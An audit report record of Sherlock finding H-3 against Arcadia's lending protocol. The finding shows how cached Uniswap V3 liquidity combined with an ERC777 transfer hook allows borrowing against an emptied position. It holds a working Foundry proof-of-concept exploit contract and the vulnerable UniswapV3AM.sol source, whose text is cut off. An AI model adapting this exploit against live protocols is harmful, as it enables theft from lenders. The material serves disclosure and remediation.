{
  "Title": "H-3: Caching Uniswap position liquidity allows borrowing using undercollateralized Uni positions",
  "Content": "# Issue H-3: Caching Uniswap position liquidity allows borrowing using undercollateralized Uni positions \n\nSource: https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/154 \n\n## Found by \n0xadrii, zzykxx\n## Summary\n\nIt is possible to fake the amount of liquidity held in a Uniswap V3 position, making the protocol believe the Uniswap position has more liquidity than the actual liquidity deposited in the position. This makes it possible to borrow using undercollateralized Uniswap positions.\n\n## Vulnerability Detail\n\nWhen depositing into an account, the `deposit()` function is called, which calls the internal `_deposit()` function. Depositing is performed in two steps:\n\n1. The registry’s `batchProcessDeposit()` function is called. This function checks if the deposited assets can be priced, and in case that a creditor is set, it also updates the exposures and underlying assets for the creditor.\n2. The assets are transferred and deposited into the account. \n\n```solidity\n// AccountV1.sol\n\nfunction _deposit(\n        address[] memory assetAddresses,\n        uint256[] memory assetIds,\n        uint256[] memory assetAmounts,\n        address from\n    ) internal {\n        // If no Creditor is set, batchProcessDeposit only checks if the assets can be priced.\n        // If a Creditor is set, batchProcessDeposit will also update the exposures of assets and underlying assets for the Creditor.\n        uint256[] memory assetTypes =\n            IRegistry(registry).batchProcessDeposit(creditor, assetAddresses, assetIds, assetAmounts);\n\n        for (uint256 i; i < assetAddresses.length; ++i) {\n            // Skip if amount is 0 to prevent storing addresses that have 0 balance.\n            if (assetAmounts[i] == 0) continue;\n\n            if (assetTypes[i] == 0) {\n                if (assetIds[i] != 0) revert AccountErrors.InvalidERC20Id();\n                _depositERC20(from, assetAddresses[i], assetAmounts[i]);\n            } else if (assetTypes[i] == 1) {\n                if (assetAmounts[i] != 1) revert AccountErrors.InvalidERC721Amount();\n                _depositERC721(from, assetAddresses[i], assetIds[i]);\n            } else if (assetTypes[i] == 2) {\n                _depositERC1155(from, assetAddresses[i], assetIds[i], assetAmounts[i]);\n            } else {\n                revert AccountErrors.UnknownAssetType();\n            }\n        }\n\n        if (erc20Stored.length + erc721Stored.length + erc1155Stored.length > ASSET_LIMIT) {\n            revert AccountErrors.TooManyAssets();\n        }\n    }\n\n```\n\nFor Uniswap positions (and assuming that a creditor is set), calling `batchProcessDeposit()` will internally trigger the `UniswapV3AM.processDirectDeposit()`:\n\n```solidity\n// UniswapV3AM.sol\n\nfunction processDirectDeposit(address creditor, address asset, uint256 assetId, uint256 amount)\n        public\n        override\n        returns (uint256 recursiveCalls, uint256 assetType)\n    {\n        // Amount deposited of a Uniswap V3 LP can be either 0 or 1 (checked in the Account).\n        // For uniswap V3 every id is a unique asset -> on every deposit the asset must added to the Asset Module.\n        if (amount == 1) _addAsset(assetId);\n\n        ...\n    }\n\n```\n\nThe Uniswap position will then be added to the protocol using the internal `_addAsset()` function. One of the most important actions performed inside this function is to store the liquidity that the Uniswap position has in that moment. Such liquidity is obtained from directly querying the NonfungiblePositionManager contract:\n\n```solidity\nfunction _addAsset(uint256 assetId) internal {\n        ...\n\n        (,, address token0, address token1,,,, uint128 liquidity,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n\n        // No need to explicitly check if token0 and token1 are allowed, _addAsset() is only called in the\n        // deposit functions and there any deposit of non-allowed Underlying Assets will revert.\n        if (liquidity == 0) revert ZeroLiquidity();\n\n        // The liquidity of the Liquidity Position is stored in the Asset Module,\n        // not fetched from the NonfungiblePositionManager.\n        // Since liquidity of a position can be increased by a non-owner,\n        // the max exposure checks could otherwise be circumvented.\n        assetToLiquidity[assetId] = liquidity;\n\n        ...\n    }\n```\n\nAs the snippet shows, the liquidity is stored in a mapping because *“Since liquidity of a position can be increased by a non-owner, the max exposure checks could otherwise be circumvented.”.*  From this point forward, and until the Uniswap position is withdrawn from the account, the collateral value (i.e the amount that the position is worth) will be computed utilizing the `_getPosition()` internal function, which will read the cached liquidity value stored in the `assetToLiquidity[assetId]` mapping, rather than directly consulting the NonFungibleManager contract. This way, the position won’t be able to surpass the max exposures:\n\n```solidity\n// UniswapV3AM.sol\n\nfunction _getPosition(uint256 assetId)\n        internal\n        view\n        returns (address token0, address token1, int24 tickLower, int24 tickUpper, uint128 liquidity)\n    {\n        // For deposited assets, the liquidity of the Liquidity Position is stored in the Asset Module,\n        // not fetched from the NonfungiblePositionManager.\n        // Since liquidity of a position can be increased by a non-owner, the max exposure checks could otherwise be circumvented.\n        liquidity = uint128(assetToLiquidity[assetId]);\n\n        if (liquidity > 0) {\n            (,, token0, token1,, tickLower, tickUpper,,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n        } else {\n            // Only used as an off-chain view function by getValue() to return the value of a non deposited Liquidity Position.\n            (,, token0, token1,, tickLower, tickUpper, liquidity,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n        }\n    }\n```\n\nHowever, storing the liquidity leads to an attack vector that allows Uniswap positions’ liquidity to be comlpetely withdrawn while making the protocol believe that the Uniswap position is still full.\n\nAs mentioned in the beginning of the report, the deposit process is done in two steps: processing assets in the registry and transferring the actual assets to the account. Because processing assets in the registry is the step where the Uniswap position’s liquidity is cached, a malicious depositor can use an ERC777 hook in the transferring process to withdraw the liquidity in the Uniswap position.\n\nThe following steps show how the attack could be performed:\n\n1. Initially, a malicious contract must be created. This contract will be the one holding the assets and depositing them into the account, and will also be able to trigger the ERC777’s `tokensToSend()` hook.\n2. The malicious contract will call the account’s `deposit()` function with two `assetAddresses` to be deposited: the first asset must be an ERC777 token, and the second asset must be the Uniswap position. \n3. `IRegistry(registry).batchProcessDeposit()` will then execute. This is the first of the two steps taking place to deposit assets, where the liquidity from the Uniswap position will be fetched from the NonFungiblePositionManager and stored in the `assetToLiquidity[assetId]` mapping. \n4. After processing the assets, the transferring phase will start. The first asset to be transferred will be the ERC777 token. This will trigger the `tokensToSend()` hook in our malicious contract. At this point, our contract is still the owner of the Uniswap position (the Uniswap position won’t be transferred until the ERC777 transfer finishes), so the liquidity in the Uniswap position can be decreased inside the hook triggered in the malicious contract. This leaves the Uniswap position with a smaller liquidity amount than the one stored in the `batchProcessDeposit()` step, making the protocol believe that the liquidity stored in the position is the one that the position had prior to starting the attack. \n5. Finally, and following the transfer of the ERC777 token, the Uniswap position will be transferred and succesfully deposited in the account. Arcadia will believe that the account has a Uniswap position worth some liquidity, when in reality the Uni position will be empty.\n\n## Proof of Concept\n\nThis proof of concept show show the previous attack can be performed so that the liquidity in the uniswap position is 0, while the collateral value for the account is far greater than 0.\n\n1. Create a `ERC777Mock.sol` file in `lib/accounts-v2/test/utils/mocks/tokens` and paste the code found in [this github gist](https://gist.github.com/0xadrii/3677f0b5dfb9dcfe6b8b3953115d03f5).\n2. Import the ERC777Mock and change the MockOracles, MockERC20 and Rates structs in `lib/accounts-v2/test/utils/Types.sol` to add an additional `token777ToUsd`, `token777` of type ERC777Mock and token777ToUsd rate:\n    \n    ```solidity\n    import \"../utils/mocks/tokens/ERC777Mock.sol\"; // <----- Import this\n    \n    ...\n    \n    struct MockOracles {\n        ArcadiaOracle stable1ToUsd;\n        ArcadiaOracle stable2ToUsd;\n        ArcadiaOracle token1ToUsd;\n        ArcadiaOracle token2ToUsd;\n        ArcadiaOracle token3ToToken4;\n        ArcadiaOracle token4ToUsd;\n        ArcadiaOracle token777ToUsd; // <----- Add this\n        ArcadiaOracle nft1ToToken1;\n        ArcadiaOracle nft2ToUsd;\n        ArcadiaOracle nft3ToToken1;\n        ArcadiaOracle sft1ToToken1;\n        ArcadiaOracle sft2ToUsd;\n    }\n    \n    struct MockERC20 {\n        ERC20Mock stable1;\n        ERC20Mock stable2;\n        ERC20Mock token1;\n        ERC20Mock token2;\n        ERC20Mock token3;\n        ERC20Mock token4;\n        ERC777Mock token777; // <----- Add this\n    }\n    \n    ...\n    \n    struct Rates {\n        uint256 stable1ToUsd;\n        uint256 stable2ToUsd;\n        uint256 token1ToUsd;\n        uint256 token2ToUsd;\n        uint256 token3ToToken4;\n        uint256 token4ToUsd;\n        uint256 token777ToUsd; // <----- Add this\n        uint256 nft1ToToken1;\n        uint256 nft2ToUsd;\n        uint256 nft3ToToken1;\n        uint256 sft1ToToken1;\n        uint256 sft2ToUsd;\n    }\n    ```\n    \n3. Replace the contents inside `lib/accounts-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/2eab11990f47385b584d6405cafa1d08).\n4. Next step is to replace the file found in `lending-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/eeac07109792c24268a00ac8e4b3339d).\n5. Create a  `PocUniswap.t.sol` file in `lending-v2/test/fuzz/LendingPool/PocUniswap.t.sol` and paste the following code snippet into it:\n    \n    ```solidity\n    /**\n     * Created by Pragma Labs\n     * SPDX-License-Identifier: BUSL-1.1\n     */\n    pragma solidity 0.8.22;\n    \n    import { LendingPool_Fuzz_Test } from \"./_LendingPool.fuzz.t.sol\";\n    \n    import { IPermit2 } from \"../../../lib/accounts-v2/src/interfaces/IPermit2.sol\";\n    import { UniswapV3AM_Fuzz_Test, UniswapV3Fixture, UniswapV3AM, IUniswapV3PoolExtension, TickMath } from \"../../../lib/accounts-v2/test/fuzz/asset-modules/UniswapV3AM/_UniswapV3AM.fuzz.t.sol\";\n    import { ERC20Mock } from \"../../../lib/accounts-v2/test/utils/mocks/tokens/ERC20Mock.sol\";\n    \n    import \"forge-std/console.sol\";\n    \n    interface IERC721 {\n        function ownerOf(uint256 tokenid) external returns(address);\n        function approve(address spender, uint256 tokenId) external;\n    }\n     \n    /// @notice Proof of Concept - Arcadia\n    contract Poc is LendingPool_Fuzz_Test, UniswapV3AM_Fuzz_Test { \n    \n        /////////////////////////////////////////////////////////////////\n        //                         CONSTANTS                           //\n        /////////////////////////////////////////////////////////////////\n        int24 private MIN_TICK = -887_272;\n        int24 private MAX_TICK = -MIN_TICK;\n    \n        /////////////////////////////////////////////////////////////////\n        //                          STORAGE                            //\n        /////////////////////////////////////////////////////////////////\n        AccountOwner public accountOwnerContract;\n        ERC20Mock token0;\n        ERC20Mock token1;\n        uint256 tokenId;\n    \n        /////////////////////////////////////////////////////////////////\n        //                          SETUP                              //\n        /////////////////////////////////////////////////////////////////\n    \n        function setUp() public override(LendingPool_Fuzz_Test, UniswapV3AM_Fuzz_Test) {\n            // Setup pool test\n            LendingPool_Fuzz_Test.setUp();\n    \n            // Deploy fixture for Uniswap.\n            UniswapV3Fixture.setUp();\n    \n            deployUniswapV3AM(address(nonfungiblePositionManager));\n    \n            vm.startPrank(users.riskManager);\n            registryExtension.setRiskParametersOfDerivedAM(\n                address(pool), address(uniV3AssetModule), type(uint112).max, 100\n            );\n     \n            token0 = mockERC20.token1;\n            token1 = mockERC20.token2;\n            (token0, token1) = token0 < token1 ? (token0, token1) : (token1, token0);\n    \n            // Deploy account owner\n            accountOwnerContract = new AccountOwner(address(nonfungiblePositionManager));\n    \n            \n            // Set origination fee\n            vm.startPrank(users.creatorAddress);\n            pool.setOriginationFee(100); // 1%\n    \n            // Transfer ownership to Account Owner \n            vm.startPrank(users.accountOwner);\n            factory.safeTransferFrom(users.accountOwner, address(accountOwnerContract), address(proxyAccount));\n            vm.stopPrank();\n            \n    \n            // Mint uniswap position underlying tokens to accountOwnerContract\n            mockERC20.token1.mint(address(accountOwnerContract), 100 ether);\n            mockERC20.token2.mint(address(accountOwnerContract), 100 ether);\n    \n            // Open Uniswap position \n            tokenId = _openUniswapPosition();\n     \n    \n            // Transfer some ERC777 tokens to accountOwnerContract. These will be used to be deposited as collateral into the account\n             vm.startPrank(users.liquidityProvider);\n             mockERC20.token777.transfer(address(accountOwnerContract), 1 ether);\n        }\n    \n        /////////////////////////////////////////////////////////////////\n        //                           POC                               //\n        /////////////////////////////////////////////////////////////////\n        /// @notice Test exploiting the reentrancy vulnerability. \n        function testVuln_borrowUsingUndercollateralizedUniswapPosition(\n            uint128 amountLoaned,\n            uint112 collateralValue,\n            uint128 liquidity,\n            uint8 originationFee\n        ) public {   \n    \n            //----------            STEP 1            ----------//\n            // Open margin account setting pool as new creditor\n            vm.startPrank(address(accountOwnerContract));\n            proxyAccount.openMarginAccount(address(pool)); \n            \n            //----------            STEP 2            ----------//\n            // Deposit assets into account. The order of the assets to be deposited is important. The first asset will be an ERC777 token that triggers the callback on transferring.\n            // The second asset will be the uniswap position.\n    \n            address[] memory assetAddresses = new address[](2);\n            assetAddresses[0] = address(mockERC20.token777);\n            assetAddresses[1] = address(nonfungiblePositionManager);\n            uint256[] memory assetIds = new uint256[](2);\n            assetIds[0] = 0;\n            assetIds[1] = tokenId;\n            uint256[] memory assetAmounts = new uint256[](2);\n            assetAmounts[0] = 1; // no need to send more than 1 wei as the ERC777 only serves to trigger the callback\n            assetAmounts[1] = 1;\n            // Set approvals\n            IERC721(address(nonfungiblePositionManager)).approve(address(proxyAccount), tokenId);\n            mockERC20.token777.approve(address(proxyAccount), type(uint256).max);\n    \n            // Perform deposit. \n            // Deposit will perform two steps:\n            // 1. processDeposit(): this step will handle the deposited assets and verify everything is correct. For uniswap positions, the liquidity in the position\n            // will be stored in the `assetToLiquidity` mapping.\n            // 2.Transferring the assets: after processing the assets, the actual asset transfers will take place. First, the ER777 colallateral will be transferred. \n            // This will trigger the callback in the accountOwnerContract (the account owner), which will withdraw all the uniswap position liquidity. Because the uniswap \n            // position liquidity has been cached in step 1 (processDeposit()), the protocol will still believe that the uniswap position has some liquidity, when in reality\n            // all the liquidity from the position has been withdrawn in the ERC777 `tokensToSend()` callback. \n            proxyAccount.deposit(assetAddresses, assetIds, assetAmounts);\n    \n            //----------       FINAL ASSERTIONS       ----------//\n            // Collateral value fetches the `assetToLiquidity` value cached prior to removing position liquidity. This does not reflect that the position is empty,\n            // hence it is possible to borrow with an empty uniswap position.\n            uint256 finalCollateralValue = proxyAccount.getCollateralValue();\n    \n            // Liquidity in the position is 0.\n            (\n                ,\n                ,\n                ,\n                ,\n                ,\n                ,\n                ,\n                uint128 liquidity,\n                ,\n                ,\n                ,\n            ) = nonfungiblePositionManager.positions(tokenId); \n    \n            console.log(\"Collateral value of account:\", finalCollateralValue);\n            console.log(\"Actual liquidity in position\", liquidity);\n    \n            assertEq(liquidity, 0);\n            assertGt(finalCollateralValue, 1000 ether); // Collateral value is greater than 1000\n        } \n    \n        function _openUniswapPosition() internal returns(uint256 tokenId) {\n            vm.startPrank(address(accountOwnerContract));\n           \n            uint160 sqrtPriceX96 = uint160(\n                calculateAndValidateRangeTickCurrent(\n                    10 * 10**18, // priceToken0\n                    20 * 10**18 // priceToken1\n                )\n            );\n    \n            // Create Uniswap V3 pool initiated at tickCurrent with cardinality 300.\n            IUniswapV3PoolExtension uniswapPool = createPool(token0, token1, TickMath.getSqrtRatioAtTick(TickMath.getTickAtSqrtRatio(sqrtPriceX96)), 300);\n    \n            // Approve liquidity\n            mockERC20.token1.approve(address(uniswapPool), type(uint256).max);\n            mockERC20.token2.approve(address(uniswapPool), type(uint256).max);\n    \n            // Mint liquidity position.\n            uint128 liquidity = 100 * 10**18;\n            tokenId = addLiquidity(uniswapPool, liquidity, address(accountOwnerContract), MIN_TICK, MAX_TICK, false);\n     \n            assertEq(IERC721(address(nonfungiblePositionManager)).ownerOf(tokenId), address(accountOwnerContract));\n        }\n     \n    }\n    \n    /// @notice ERC777Sender interface\n    interface IERC777Sender {\n        /**\n         * @dev Called by an {IERC777} token contract whenever a registered holder's\n         * (`from`) tokens are about to be moved or destroyed. The type of operation\n         * is conveyed by `to` being the zero address or not.\n         *\n         * This call occurs _before_ the token contract's state is updated, so\n         * {IERC777-balanceOf}, etc., can be used to query the pre-operation state.\n         *\n         * This function may revert to prevent the operation from being executed.\n         */\n        function tokensToSend(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external;\n    }\n    \n    interface INonfungiblePositionManager {\n         function positions(uint256 tokenId)\n            external\n            view\n            returns (\n                uint96 nonce,\n                address operator,\n                address token0,\n                address token1,\n                uint24 fee,\n                int24 tickLower,\n                int24 tickUpper,\n                uint128 liquidity,\n                uint256 feeGrowthInside0LastX128,\n                uint256 feeGrowthInside1LastX128,\n                uint128 tokensOwed0,\n                uint128 tokensOwed1\n            );\n    \n        struct DecreaseLiquidityParams {\n            uint256 tokenId;\n            uint128 liquidity;\n            uint256 amount0Min;\n            uint256 amount1Min;\n            uint256 deadline;\n        }\n        function decreaseLiquidity(DecreaseLiquidityParams calldata params)\n            external\n            payable\n            returns (uint256 amount0, uint256 amount1);\n    }\n    \n     /// @notice AccountOwner contract that will trigger the attack via ERC777's `tokensToSend()` callback\n    contract AccountOwner is IERC777Sender  {\n    \n            INonfungiblePositionManager public nonfungiblePositionManager;\n    \n            constructor(address _nonfungiblePositionManager) {\n                nonfungiblePositionManager = INonfungiblePositionManager(_nonfungiblePositionManager);\n            }\n    \n         function tokensToSend(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external {\n            // Remove liquidity from Uniswap position\n           (\n                ,\n                ,\n                ,\n                ,\n                ,\n                ,\n                 ,\n                uint128 liquidity,\n                ,\n                ,\n                ,\n            ) = nonfungiblePositionManager.positions(1); // tokenId 1\n    \n            INonfungiblePositionManager.DecreaseLiquidityParams memory params = INonfungiblePositionManager.DecreaseLiquidityParams({\n                tokenId: 1,\n                liquidity: liquidity,\n                amount0Min: 0,\n                amount1Min: 0,\n                deadline: block.timestamp\n            });\n            nonfungiblePositionManager.decreaseLiquidity(params);\n        }\n      \n    \n        function onERC721Received(address, address, uint256, bytes calldata) public pure returns (bytes4) {\n            return bytes4(abi.encodeWithSignature(\"onERC721Received(address,address,uint256,bytes)\"));\n        }\n    \n    }\n    ```\n    \n6. Execute the following command being inside the `lending-v2` folder: `forge test --mt testVuln_borrowUsingUndercollateralizedUniswapPosition -vvvvv`. \n\nNOTE: It is possible that you find issues related to code not being found. This is because the Uniswap V3 deployment uses foundry’s `vm.getCode()` and we are importing the deployment file from the `accounts-v2` repo to the `lending-v2` repo, which makes foundry throw some errors. To fix this, just compile the contracts in the `accounts-v2` repo and copy the missing folders from the `accounts-v2/out` generated folder into the `lending-v2/out` folder.\n\n## Impact\n\nHigh. The protocol will always believe that there is liquidity deposited in the Uniswap position while in reality the position is empty. This allows for undercollateralized borrows, essentially enabling the protocol to be drained if the attack is performed utilizing several uniswap positions.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/asset-modules/UniswapV3/UniswapV3AM.sol#L107\n\nhttps://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L844\n\nhttps://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L855\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere are several ways to mitigate this issue. One possible option is to perform the transfer of assets when depositing at the same time that the asset is processed, instead of first processing the assets (and storing the Uniswap liquidity) and then transferring them. Another option is to perform a liquidity check after depositing the Uniswap position, ensuring that the liquidity stored in the assetToLiquidity[assetId] mapping and the one returned by the NonFungiblePositionManager are the same.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid: high(2)\n\n\n\n**sherlock-admin**\n\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/accounts-v2/pull/174.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/137",
  "Code": [
    {
      "filename": "accounts-v2/src/asset-modules/UniswapV3/UniswapV3AM.sol",
      "content": "/**\n * Created by Pragma Labs\n * SPDX-License-Identifier: BUSL-1.1\n */\npragma solidity 0.8.22;\n\nimport { DerivedAM, FixedPointMathLib, IRegistry } from \"../abstracts/AbstractDerivedAM.sol\";\nimport { FixedPoint96 } from \"./libraries/FixedPoint96.sol\";\nimport { FixedPoint128 } from \"./libraries/FixedPoint128.sol\";\nimport { FullMath } from \"./libraries/FullMath.sol\";\nimport { INonfungiblePositionManager } from \"./interfaces/INonfungiblePositionManager.sol\";\nimport { IUniswapV3Pool } from \"./interfaces/IUniswapV3Pool.sol\";\nimport { LiquidityAmounts } from \"./libraries/LiquidityAmounts.sol\";\nimport { PoolAddress } from \"./libraries/PoolAddress.sol\";\nimport { AssetValuationLib, AssetValueAndRiskFactors } from \"../../libraries/AssetValuationLib.sol\";\nimport { TickMath } from \"./libraries/TickMath.sol\";\n\n/**\n * @title Asset Module for Uniswap V3 Liquidity Positions\n * @author Pragma Labs\n * @notice The pricing logic and basic information for Uniswap V3 Liquidity Positions.\n * @dev The UniswapV3AM will not price the LP tokens via direct price oracles,\n * it will break down liquidity positions in the underlying tokens (ERC20s).\n * Only LP tokens for which the underlying tokens are allowed as collateral can be priced.\n * @dev No end-user should directly interact with the UniswapV3AM, only the Registry,\n * or the contract owner.\n */\ncontract UniswapV3AM is DerivedAM {\n    using FixedPointMathLib for uint256;\n\n    /* //////////////////////////////////////////////////////////////\n                                CONSTANTS\n    ////////////////////////////////////////////////////////////// */\n\n    // The contract address of the NonfungiblePositionManager.\n    INonfungiblePositionManager internal immutable NON_FUNGIBLE_POSITION_MANAGER;\n\n    // The contract address of the Uniswap V3 (or exact clone) Factory.\n    address internal immutable UNISWAP_V3_FACTORY;\n\n    /* //////////////////////////////////////////////////////////////\n                                STORAGE\n    ////////////////////////////////////////////////////////////// */\n\n    // The liquidity of the Liquidity Position when it was deposited.\n    mapping(uint256 assetId => uint256 liquidity) internal assetToLiquidity;\n\n    // The unique identifiers of the Underlying Assets of a Liquidity Position.\n    mapping(bytes32 assetKey => bytes32[] underlyingAssetKeys) internal assetToUnderlyingAssets;\n\n    /* //////////////////////////////////////////////////////////////\n                                ERRORS\n    ////////////////////////////////////////////////////////////// */\n\n    error InvalidId();\n    error ZeroLiquidity();\n    error InvalidAmount();\n\n    /* //////////////////////////////////////////////////////////////\n                                CONSTRUCTOR\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @param registry_ The contract address of the Registry.\n     * @param nonFungiblePositionManager The contract address of the protocols NonFungiblePositionManager.\n     * @dev The ASSET_TYPE, necessary for the deposit and withdraw logic in the Accounts, is \"1\" for Uniswap V3 Liquidity Positions (ERC721).\n     */\n    constructor(address registry_, address nonFungiblePositionManager) DerivedAM(registry_, 1) {\n        NON_FUNGIBLE_POSITION_MANAGER = INonfungiblePositionManager(nonFungiblePositionManager);\n        UNISWAP_V3_FACTORY = INonfungiblePositionManager(nonFungiblePositionManager).factory();\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        ASSET MANAGEMENT\n    ///////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Adds the mapping from the NonfungiblePositionManager to this Asset Module in this Registry.\n     * @dev Since all assets will have the same contract address, only the NonfungiblePositionManager has to be added to the Registry.\n     */\n    function setProtocol() external onlyOwner {\n        inAssetModule[address(NON_FUNGIBLE_POSITION_MANAGER)] = true;\n\n        // Will revert in Registry if asset was already added.\n        IRegistry(REGISTRY).addAsset(address(NON_FUNGIBLE_POSITION_MANAGER));\n    }\n\n    /**\n     * @notice Adds a new asset (Liquidity Position) to the UniswapV3AM.\n     * @param assetId The id of the asset.\n     * @dev All assets (Liquidity Positions) will have the same contract address (the NonfungiblePositionManager),\n     * but a different id.\n     */\n    function _addAsset(uint256 assetId) internal {\n        if (assetId > type(uint96).max) revert InvalidId();\n\n        (,, address token0, address token1,,,, uint128 liquidity,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n\n        // No need to explicitly check if token0 and token1 are allowed, _addAsset() is only called in the\n        // deposit functions and there any deposit of non-allowed Underlying Assets will revert.\n        if (liquidity == 0) revert ZeroLiquidity();\n\n        // The liquidity of the Liquidity Position is stored in the Asset Module,\n        // not fetched from the NonfungiblePositionManager.\n        // Since liquidity of a position can be increased by a non-owner,\n        // the max exposure checks could otherwise be circumvented.\n        assetToLiquidity[assetId] = liquidity;\n\n        bytes32 assetKey = _getKeyFromAsset(address(NON_FUNGIBLE_POSITION_MANAGER), assetId);\n        bytes32[] memory underlyingAssetKeys = new bytes32[](2);\n        underlyingAssetKeys[0] = _getKeyFromAsset(token0, 0);\n        underlyingAssetKeys[1] = _getKeyFromAsset(token1, 0);\n        assetToUnderlyingAssets[assetKey] = underlyingAssetKeys;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        ASSET INFORMATION\n    ///////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Checks for a token address and the corresponding id if it is allowed.\n     * @param asset The contract address of the asset.\n     * @param assetId The id of the asset.\n     * @return A boolean, indicating if the asset is allowed.\n     */\n    function isAllowed(address asset, uint256 assetId) public view override returns (bool) {\n        if (asset != address(NON_FUNGIBLE_POSITION_MANAGER)) return false;\n\n        try NON_FUNGIBLE_POSITION_MANAGER.positions(assetId) returns (\n            uint96,\n            address,\n            address token0,\n            address token1,\n            uint24,\n            int24,\n            int24,\n            uint128 liquidity,\n            uint256,\n            uint256,\n            uint128,\n            uint128\n        ) {\n            return IRegistry(REGISTRY).isAllowed(token0, 0) && IRegistry(REGISTRY).isAllowed(token1, 0) && liquidity > 0;\n        } catch {\n            return false;\n        }\n    }\n\n    /**\n     * @notice Returns the unique identifiers of the Underlying Assets.\n     * @param assetKey The unique identifier of the asset.\n     * @return underlyingAssetKeys The unique identifiers of the Underlying Assets.\n     */\n    function _getUnderlyingAssets(bytes32 assetKey)\n        internal\n        view\n        override\n        returns (bytes32[] memory underlyingAssetKeys)\n    {\n        underlyingAssetKeys = assetToUnderlyingAssets[assetKey];\n\n        if (underlyingAssetKeys.length == 0) {\n            // Only used as an off-chain view function by getValue() to return the value of a non deposited Liquidity Position.\n            (, uint256 assetId) = _getAssetFromKey(assetKey);\n            (,, address token0, address token1,,,,,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n\n            underlyingAssetKeys = new bytes32[](2);\n            underlyingAssetKeys[0] = _getKeyFromAsset(token0, 0);\n            underlyingAssetKeys[1] = _getKeyFromAsset(token1, 0);\n        }\n    }\n\n    /**\n     * @notice Calculates for a given asset the corresponding amount(s) of Underlying Asset(s).\n     * @param creditor The contract address of the creditor.\n     * @param assetKey The unique identifier of the asset.\n     * param assetAmount The amount of the asset, in the decimal precision of the Asset.\n     * param underlyingAssetKeys The unique identifiers of the Underlying Assets.\n     * @return underlyingAssetsAmounts The corresponding amount(s) of Underlying Asset(s), in the decimal precision of the Underlying Asset.\n     * @return rateUnderlyingAssetsToUsd The usd rates of 1e18 tokens of Underlying Asset, with 18 decimals precision.\n     * @dev External price feeds of the Underlying Assets are used to calculate the flashloan resistant amounts.\n     * This approach accommodates scenarios where an underlying asset could be\n     * a derived asset itself (e.g., USDC/aUSDC pool), ensuring more versatile and accurate price calculations.\n     */\n    function _getUnderlyingAssetsAmounts(address creditor, bytes32 assetKey, uint256 amount, bytes32[] memory)\n        internal\n        view\n        override\n        returns (uint256[] memory underlyingAssetsAmounts, AssetValueAndRiskFactors[] memory rateUnderlyingAssetsToUsd)\n    {\n        // Amount of a Uniswap V3 LP can only be either 0 or 1.\n        if (amount == 0) {\n            return (new uint256[](2), rateUnderlyingAssetsToUsd);\n        }\n\n        (, uint256 assetId) = _getAssetFromKey(assetKey);\n\n        (address token0, address token1, int24 tickLower, int24 tickUpper, uint128 liquidity) = _getPosition(assetId);\n\n        // Get the trusted rates to USD of the Underlying Assets.\n        bytes32[] memory underlyingAssetKeys = new bytes32[](2);\n        underlyingAssetKeys[0] = _getKeyFromAsset(token0, 0);\n        underlyingAssetKeys[1] = _getKeyFromAsset(token1, 0);\n        rateUnderlyingAssetsToUsd = _getRateUnderlyingAssetsToUsd(creditor, underlyingAssetKeys);\n\n        // Calculate amount0 and amount1 of the principal (the actual liquidity position).\n        (uint256 principal0, uint256 principal1) = _getPrincipalAmounts(\n            tickLower,\n            tickUpper,\n            liquidity,\n            rateUnderlyingAssetsToUsd[0].assetValue,\n            rateUnderlyingAssetsToUsd[1].assetValue\n        );\n\n        // Calculate amount0 and amount1 of the accumulated fees.\n        (uint256 fee0, uint256 fee1) = _getFeeAmounts(assetId);\n\n        // As the sole liquidity provider in a new pool,\n        // a malicious actor could bypass the max exposure by\n        // continiously swapping large amounts and increasing the fee portion\n        // of the liquidity position.\n        fee0 = fee0 > principal0 ? principal0 : fee0;\n        fee1 = fee1 > principal1 ? principal1 : fee1;\n\n        underlyingAssetsAmounts = new uint256[](2);\n        unchecked {\n            underlyingAssetsAmounts[0] = principal0 + fee0;\n            underlyingAssetsAmounts[1] = principal1 + fee1;\n        }\n    }\n\n    /**\n     * @notice Returns the position information.\n     * @param assetId The id of the asset.\n     * @return token0 Token0 of the Liquidity Pool.\n     * @return token1 Token1 of the Liquidity Pool.\n     * @return tickLower The lower tick of the liquidity position.\n     * @return tickUpper The upper tick of the liquidity position.\n     * @return liquidity The liquidity per tick of the liquidity position.\n     */\n    function _getPosition(uint256 assetId)\n        internal\n        view\n        returns (address token0, address token1, int24 tickLower, int24 tickUpper, uint128 liquidity)\n    {\n        // For deposited assets, the liquidity of the Liquidity Position is stored in the Asset Module,\n        // not fetched from the NonfungiblePositionManager.\n        // Since liquidity of a position can be increased by a non-owner, the max exposure checks could otherwise be circumvented.\n        liquidity = uint128(assetToLiquidity[assetId]);\n\n        if (liquidity > 0) {\n            (,, token0, token1,, tickLower, tickUpper,,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n        } else {\n            // Only used as an off-chain view function by getValue() to return the value of a non deposited Liquidity Position.\n            (,, token0, token1,, tickLower, tickUpper, liquidity,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n        }\n    }\n\n  